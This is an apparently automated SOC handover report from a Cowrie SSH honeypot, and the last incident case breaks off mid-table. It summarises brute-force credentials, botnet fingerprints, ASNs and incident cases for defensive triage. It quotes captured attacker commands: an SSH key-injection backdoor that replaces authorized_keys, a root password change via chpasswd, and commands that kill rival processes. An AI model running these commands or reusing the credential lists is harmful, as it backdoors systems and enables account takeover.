# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-01 |
| **Generated At** | 2026-06-01T17:48:37Z |
| **Shift Time** | 17:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **558** |
| Confirmed Threats | **538** |
| False Positives Filtered | **20** (3.6%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **26** |
| High Severity Cases | **106** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **452** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **238** |
| Unique Credential Pairs | **130** |
| Unique Usernames | **67** |
| Unique Passwords | **116** |
| Successful Auth Pairs | **79** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 109 |
| `345gs5662d34` | 51 |
| `ubuntu` | 5 |
| `user` | 4 |
| `postgres` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 51 |
| `3245gs5662d34` | 49 |
| `123456` | 8 |
| `123` | 5 |
| `Jd@123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 51 |
| `root` | `3245gs5662d34` | 49 |
| `root` | `Jd@123456` | 2 |
| `root` | `test#123` | 2 |
| `root` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa123.com` | `85.251.45.115` | 2026-06-01T11:44:15 |
| `root` | `3245gs5662d34` | `85.251.45.115` | 2026-06-01T11:44:20 |
| `root` | `serveradmin` | `103.143.231.2` | 2026-06-01T11:45:13 |
| `root` | `3245gs5662d34` | `103.143.231.2` | 2026-06-01T11:45:19 |
| `root` | `123456.qq` | `147.78.181.161` | 2026-06-01T11:45:22 |
| `root` | `Jd@123456` | `189.146.252.91` | 2026-06-01T11:45:23 |
| `root` | `3245gs5662d34` | `147.78.181.161` | 2026-06-01T11:45:27 |
| `root` | `520520` | `43.165.174.224` | 2026-06-01T11:45:28 |
| `root` | `3245gs5662d34` | `189.146.252.91` | 2026-06-01T11:45:30 |
| `root` | `3245gs5662d34` | `43.165.174.224` | 2026-06-01T11:45:32 |
| `root` | `test#123` | `102.88.137.80` | 2026-06-01T11:46:09 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-06-01T11:46:16 |
| `root` | `P@ssw0rd!!!!` | `60.188.58.108` | 2026-06-01T11:49:06 |
| `root` | `test#123` | `101.79.165.43` | 2026-06-01T11:49:37 |
| `root` | `3245gs5662d34` | `101.79.165.43` | 2026-06-01T11:49:40 |
| `root` | `Password01@` | `101.79.167.192` | 2026-06-01T11:49:42 |
| `root` | `3245gs5662d34` | `101.79.167.192` | 2026-06-01T11:49:45 |
| `root` | `Server@123` | `101.79.167.192` | 2026-06-01T11:51:33 |
| `root` | `Test123456@` | `101.79.167.192` | 2026-06-01T11:55:23 |
| `root` | `Jd@123456` | `101.79.167.192` | 2026-06-01T12:03:15 |
| `root` | `admin@520` | `101.79.167.192` | 2026-06-01T12:07:15 |
| `root` | `112233` | `101.79.167.192` | 2026-06-01T12:09:08 |
| `root` | `1234567aA` | `104.28.245.40` | 2026-06-01T12:25:01 |
| `root` | `3245gs5662d34` | `104.28.245.40` | 2026-06-01T12:25:18 |
| `root` | `Aa123!@#` | `103.186.1.59` | 2026-06-01T12:28:35 |
| `root` | `3245gs5662d34` | `103.186.1.59` | 2026-06-01T12:28:40 |
| `root` | `ready2go` | `61.76.112.4` | 2026-06-01T12:29:39 |
| `root` | `3245gs5662d34` | `61.76.112.4` | 2026-06-01T12:29:43 |
| `root` | `qahiliselo` | `61.76.112.4` | 2026-06-01T12:37:12 |
| `root` | `Abc123456*` | `61.76.112.4` | 2026-06-01T12:44:14 |
| `root` | `Tk123456@` | `61.76.112.4` | 2026-06-01T12:51:40 |
| `root` | `htvx32v6` | `61.76.112.4` | 2026-06-01T12:56:26 |
| `root` | `cyber@123` | `61.76.112.4` | 2026-06-01T12:58:49 |
| `root` | `1qazxsw2!@#` | `156.255.1.208` | 2026-06-01T14:05:41 |
| `root` | `3245gs5662d34` | `156.255.1.208` | 2026-06-01T14:05:44 |
| `root` | `password` | `185.220.177.34` | 2026-06-01T14:06:56 |
| `root` | `P@ssw0rdP@ssw0rd` | `173.212.212.105` | 2026-06-01T14:17:26 |
| `root` | `3245gs5662d34` | `173.212.212.105` | 2026-06-01T14:17:29 |
| `root` | `11111` | `59.26.132.170` | 2026-06-01T14:18:28 |
| `root` | `3245gs5662d34` | `59.26.132.170` | 2026-06-01T14:18:33 |
| `root` | `Support@2025` | `218.150.184.241` | 2026-06-01T14:18:46 |
| `root` | `3245gs5662d34` | `218.150.184.241` | 2026-06-01T14:18:50 |
| `root` | `1qazxsw2!@#` | `173.212.212.105` | 2026-06-01T14:19:18 |
| `root` | `Test@12345` | `59.26.132.170` | 2026-06-01T14:22:10 |
| `root` | `abcabc123` | `173.212.212.105` | 2026-06-01T14:23:02 |
| `root` | `jancok123` | `59.26.132.170` | 2026-06-01T14:25:57 |
| `root` | `^YHN7ujm` | `173.212.212.105` | 2026-06-01T14:30:43 |
| `root` | `1q2w3e!Q@W#E` | `173.212.212.105` | 2026-06-01T14:34:34 |
| `root` | `Qwer@123456789` | `101.126.141.163` | 2026-06-01T14:54:53 |
| `root` | `Root!@#123` | `186.248.197.77` | 2026-06-01T14:58:54 |
| `root` | `3245gs5662d34` | `186.248.197.77` | 2026-06-01T14:59:03 |
| `root` | `Aa123123!` | `186.248.197.77` | 2026-06-01T15:00:44 |
| `root` | `Ks123456` | `120.1.87.115` | 2026-06-01T15:07:42 |
| `root` | `555` | `186.248.197.77` | 2026-06-01T15:07:46 |
| `root` | `Gg123456!` | `186.248.197.77` | 2026-06-01T15:11:21 |
| `root` | `bismillah123` | `186.248.197.77` | 2026-06-01T15:14:59 |
| `root` | `admin@888` | `186.248.197.77` | 2026-06-01T15:18:32 |
| `root` | `Secure@123` | `43.243.142.42` | 2026-06-01T15:22:19 |
| `root` | `3245gs5662d34` | `43.243.142.42` | 2026-06-01T15:22:21 |
| `root` | `aA111222` | `43.243.142.42` | 2026-06-01T15:25:49 |
| `root` | `!QAZxsw2#EDCvfr4` | `43.243.142.42` | 2026-06-01T15:29:24 |
| `root` | `Pass@word123` | `202.165.22.58` | 2026-06-01T16:06:42 |
| `root` | `3245gs5662d34` | `202.165.22.58` | 2026-06-01T16:06:45 |
| `root` | `admin` | `176.193.121.145` | 2026-06-01T16:10:09 |
| `root` | `Gr123456@` | `43.160.214.131` | 2026-06-01T16:12:57 |
| `root` | `3245gs5662d34` | `43.160.214.131` | 2026-06-01T16:12:59 |
| `root` | `1qaz@WSX#EDC` | `83.171.89.209` | 2026-06-01T16:16:56 |
| `root` | `3245gs5662d34` | `83.171.89.209` | 2026-06-01T16:17:01 |
| `root` | `pi` | `83.171.89.209` | 2026-06-01T16:20:53 |
| `root` | `Gr123456@` | `83.171.89.209` | 2026-06-01T16:22:09 |
| `root` | `Wn123456` | `117.247.23.131` | 2026-06-01T16:22:57 |
| `root` | `3245gs5662d34` | `117.247.23.131` | 2026-06-01T16:22:59 |
| `root` | `demo` | `83.171.89.209` | 2026-06-01T16:24:51 |
| `root` | `Qwerty@12345` | `118.145.102.69` | 2026-06-01T16:26:42 |
| `root` | `Ab1234567` | `83.171.89.209` | 2026-06-01T16:28:51 |
| `root` | `Password123456789` | `83.171.89.209` | 2026-06-01T16:30:05 |
| `root` | `20192019` | `61.36.200.131` | 2026-06-01T16:34:30 |
| `root` | `Mx123456` | `61.36.200.131` | 2026-06-01T16:36:50 |
| `root` | `3245gs5662d34` | `61.36.200.131` | 2026-06-01T16:36:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **558** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 274 |
| Go SSH scanner | 5 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 213 | 31 |
| `03a80b21afa8...` | Modern SSH client | 33 | 4 |
| `713bd9cc9355...` | Mirai/variant | 3 | 1 |
| `af8223ac9914...` | libssh-based | 2 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 213 | 31 | Mirai/variant |
| `03a80b21afa8...` | libssh | 33 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 21 | 5 | — |
| `713bd9cc9355...` | libssh | 3 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 2 | 1 | libssh-based |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 49 | 22 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:I7C4WaOQ6MDk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `173.212.212.105`, `61.36.200.131`, `118.145.102.69`, `60.188.58.108`, `101.126.141.163`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
uname -m
```
```
cat /proc/cpuinfo | grep model | grep name | wc -l
```
Source IPs: `120.1.87.115`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `61.36.200.131`, `59.26.132.170`, `102.88.137.80`, `43.243.142.42`, `101.79.165.43`, `61.76.112.4`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **53** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (106)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-eddeff6475f0

| Field | Detail |
|---|---|
| **Source IP** | `85.251.45[.]115` |
| **First Seen** | 2026-06-01 11:44 |
| **Last Seen** | 2026-06-01 11:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:44:15` | `cowrie.session.connect` |
| `2026-06-01 11:44:15` | `cowrie.client.version` |
| `2026-06-01 11:44:15` | `cowrie.client.kex` |
| `2026-06-01 11:44:15` | `cowrie.login.success` |
| `2026-06-01 11:44:16` | `cowrie.session.params` |
| `2026-06-01 11:44:16` | `cowrie.command.input` |
| `2026-06-01 11:44:16` | `cowrie.command.failed` |
| `2026-06-01 11:44:16` | `cowrie.log.closed` |
| `2026-06-01 11:44:16` | `cowrie.session.params` |
| `2026-06-01 11:44:16` | `cowrie.command.input` |
| `2026-06-01 11:44:17` | `cowrie.session.file_download` |
| `2026-06-01 11:44:17` | `cowrie.log.closed` |
| `2026-06-01 11:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.251.45[.]115` to AbuseIPDB if not already reported
- [ ] Block `85.251.45[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26b725fda29

| Field | Detail |
|---|---|
| **Source IP** | `85.251.45[.]115` |
| **First Seen** | 2026-06-01 11:44 |
| **Last Seen** | 2026-06-01 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:44:19` | `cowrie.session.connect` |
| `2026-06-01 11:44:19` | `cowrie.client.version` |
| `2026-06-01 11:44:19` | `cowrie.client.kex` |
| `2026-06-01 11:44:20` | `cowrie.login.success` |
| `2026-06-01 11:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.251.45[.]115` to AbuseIPDB if not already reported
- [ ] Block `85.251.45[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bc4818a9ae

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:11` | `cowrie.session.connect` |
| `2026-06-01 11:45:11` | `cowrie.client.version` |
| `2026-06-01 11:45:11` | `cowrie.client.kex` |
| `2026-06-01 11:45:13` | `cowrie.login.success` |
| `2026-06-01 11:45:13` | `cowrie.session.params` |
| `2026-06-01 11:45:13` | `cowrie.command.input` |
| `2026-06-01 11:45:13` | `cowrie.command.failed` |
| `2026-06-01 11:45:14` | `cowrie.log.closed` |
| `2026-06-01 11:45:14` | `cowrie.session.params` |
| `2026-06-01 11:45:14` | `cowrie.command.input` |
| `2026-06-01 11:45:14` | `cowrie.session.file_download` |
| `2026-06-01 11:45:14` | `cowrie.log.closed` |
| `2026-06-01 11:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e0cf1ae0791

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:18` | `cowrie.session.connect` |
| `2026-06-01 11:45:18` | `cowrie.client.version` |
| `2026-06-01 11:45:18` | `cowrie.client.kex` |
| `2026-06-01 11:45:19` | `cowrie.login.success` |
| `2026-06-01 11:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cb401e616e

| Field | Detail |
|---|---|
| **Source IP** | `147.78.181[.]161` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:21` | `cowrie.session.connect` |
| `2026-06-01 11:45:21` | `cowrie.client.version` |
| `2026-06-01 11:45:21` | `cowrie.client.kex` |
| `2026-06-01 11:45:22` | `cowrie.login.success` |
| `2026-06-01 11:45:22` | `cowrie.session.params` |
| `2026-06-01 11:45:22` | `cowrie.command.input` |
| `2026-06-01 11:45:22` | `cowrie.command.failed` |
| `2026-06-01 11:45:23` | `cowrie.log.closed` |
| `2026-06-01 11:45:23` | `cowrie.session.params` |
| `2026-06-01 11:45:23` | `cowrie.command.input` |
| `2026-06-01 11:45:23` | `cowrie.session.file_download` |
| `2026-06-01 11:45:23` | `cowrie.log.closed` |
| `2026-06-01 11:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.78.181[.]161` to AbuseIPDB if not already reported
- [ ] Block `147.78.181[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb61134158f

| Field | Detail |
|---|---|
| **Source IP** | `189.146.252[.]91` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:21` | `cowrie.session.connect` |
| `2026-06-01 11:45:21` | `cowrie.client.version` |
| `2026-06-01 11:45:22` | `cowrie.client.kex` |
| `2026-06-01 11:45:23` | `cowrie.login.success` |
| `2026-06-01 11:45:24` | `cowrie.session.params` |
| `2026-06-01 11:45:24` | `cowrie.command.input` |
| `2026-06-01 11:45:24` | `cowrie.command.failed` |
| `2026-06-01 11:45:24` | `cowrie.log.closed` |
| `2026-06-01 11:45:25` | `cowrie.session.params` |
| `2026-06-01 11:45:25` | `cowrie.command.input` |
| `2026-06-01 11:45:25` | `cowrie.session.file_download` |
| `2026-06-01 11:45:25` | `cowrie.log.closed` |
| `2026-06-01 11:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.252[.]91` to AbuseIPDB if not already reported
- [ ] Block `189.146.252[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1664e5ec6c

| Field | Detail |
|---|---|
| **Source IP** | `147.78.181[.]161` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:26` | `cowrie.session.connect` |
| `2026-06-01 11:45:26` | `cowrie.client.version` |
| `2026-06-01 11:45:26` | `cowrie.client.kex` |
| `2026-06-01 11:45:27` | `cowrie.login.success` |
| `2026-06-01 11:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.78.181[.]161` to AbuseIPDB if not already reported
- [ ] Block `147.78.181[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-884fe5468dc8

| Field | Detail |
|---|---|
| **Source IP** | `43.165.174[.]224` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:28` | `cowrie.session.connect` |
| `2026-06-01 11:45:28` | `cowrie.client.version` |
| `2026-06-01 11:45:28` | `cowrie.client.kex` |
